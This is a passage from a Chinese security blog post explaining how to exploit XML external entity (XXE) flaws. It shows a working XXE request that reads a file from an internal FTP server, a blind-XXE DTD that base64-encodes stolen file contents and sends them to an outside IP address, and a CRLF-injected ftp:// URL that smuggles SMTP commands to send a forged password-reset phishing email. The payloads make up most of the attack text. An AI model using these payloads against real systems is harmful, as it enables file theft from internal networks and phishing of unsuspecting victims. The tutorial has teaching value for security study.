text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 109</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY a SYSTEM &quot;ftp:&#x2F;&#x2F;admin:admin@192.168.1.9:21&#x2F;1.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;a;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-134.png" alt="upload successful"><br>可以看到成功获取到文件内容</p>
<ul>
<li>Blind XXE利用<br>服务器dtd文件修改如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ftp:&#x2F;&#x2F;admin:admin@192.168.1.9:21&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.100.247.157:12345?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
跟dtd文件窃取利用方式一致</li>
</ul>
<p><img src="/images/pasted-135.png" alt="upload successful"><br>成功获取到内容，使用base64解密</p>
<p><img src="/images/pasted-136.png" alt="upload successful"></p>
<h5 id="进阶利用三-钓鱼"><a href="#进阶利用三-钓鱼" class="headerlink" title="进阶利用三:钓鱼"></a>进阶利用三:钓鱼</h5><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼、</p>
<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
<p>示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>
<p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
<p>示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http:&#x2F;&#x2F;PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>
<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
<p>参考文章：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;177979.html</span><br></pre></td></tr></table></figure>
<p>由于没有搭建相关服务，所以利用xxe钓鱼先欠着！！！！溜了溜了</p>
<p>目前就到这里，希望各位大佬能多多与我交流其他的利用方式，本人菜鸡一枚，希望大佬勿喷</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">愤怒的小恐龙</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.fndxkl.xyz/2021/08/16/xxe/">http://www.fndxkl.xyz/2021/08/16/xxe/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.fndxkl.xyz" target="_blank">愤怒的小恐龙</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a><a class="post-meta__tags" href="/tags/xxe/">xxe</a></div><div class="post_share"><div class="social-share" data-image="http://www.fndxkl.xyz/img1/t3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/20/%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E4%B8%ADjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%80%86%E5%90%91/"><img class="prev-cover" src="http://www.fndxkl.xyz/img1/t5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">某次渗透中js加解密逆向</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/09/zzcms2019%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"><img class="next-cover" src="http://www.fndxkl.xyz/img1/t7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">zzcms2019代码审计-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">愤怒的小恐龙</div><div class="author-info__description">别人生气，我不气，气出病来没人替</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fndxkl1"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXXE"><span class="toc-number">2.</span> <span class="toc-text">什么是XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xml%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text">xml基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">如何利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">5.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87DTD%E7%AA%83%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">通过DTD窃取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B4%E4%B8%AA%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">整个调用过程：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">7.</span> <span class="toc-text">远程代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text">进阶使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E4%B8%80-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91web%E6%9C%8D%E5%8A%A1sql%E6%B3%A8%E5%85%A5"><span class="toc-number">8.1.</span> <span class="toc-text">进阶利用一:攻击内网web服务sql注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E4%BA%8C-%E5%86%85%E7%BD%91ftp%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.2.</span> <span class="toc-text">进阶利用二:内网ftp服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E4%B8%89-%E9%92%93%E9%B1%BC"><span class="toc-number">8.3.</span> <span class="toc-text">进阶利用三:钓鱼</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/20/%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E4%B8%ADjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%80%86%E5%90%91/" title="某次渗透中js加解密逆向"><img src="http://www.fndxkl.xyz/img1/t5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某次渗透中js加解密逆向"/></a><div class="content"><a class="title" href="/2021/08/20/%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E4%B8%ADjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%80%86%E5%90%91/" title="某次渗透中js加解密逆向">某次渗透中js加解密逆向</a><time datetime="2021-08-20T11:21:00.000Z" title="发表于 2021-08-20 19:21:00">2021-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/16/xxe/" title="xxe利用"><img src="http://www.fndxkl.xyz/img1/t3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xxe利用"/></a><div class="content"><a class="title" href="/2021/08/16/xxe/" title="xxe利用">xxe利用</a><time datetime="2021-08-16T11:32:00.000Z" title="发表于 2021-08-16 19:32:00">2021-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/09/zzcms2019%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/" title="zzcms2019代码审计-1"><img src="http://www.fndxkl.xyz/img1/t7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zzcms2019代码审计-1"/></a><div class="content"><a class="title" href="/2021/08/09/zzcms2019%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/" title="zzcms2019代码审计-1">zzcms2019代码审计-1</a><time datetime="2021-08-09T08:10:00.000Z" title="发表于 2021-08-09 16:10:00">2021-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/19/%E7%94%A8%E5%8F%8B%E8%84%9A%E6%9C%AC/" title="用友漏洞检测脚本"><img src="http://www.fndxkl.xyz/img1/t6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="用友漏洞检测脚本"/></a><div class="content"><a class="title" href="/2021/07/19/%E7%94%A8%E5%8F%8B%E8%84%9A%E6%9C%AC/" title="用友漏洞检测脚本">用友漏洞检测脚本</a><time datetime="2021-07-19T14:44:49.000Z" title="发表于 2021-07-19 22:44:49">2021-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/08/YApi-RCE/" title="YApi RCE"><img src="http://www.fndxkl.xyz/img1/t4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YApi RCE"/></a><div class="content"><a class="title" href="/2021/07/08/YApi-RCE/" title="YApi RCE">YApi RCE</a><time datetime="2021-07-08T08:13:00.000Z" title="发表于 2021-07-08 16:13:00">2021-07-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 愤怒的小恐龙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/kiana.model.json"},"display":{"superSample":2,"width":300,"height":600,"position":"left","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body></html>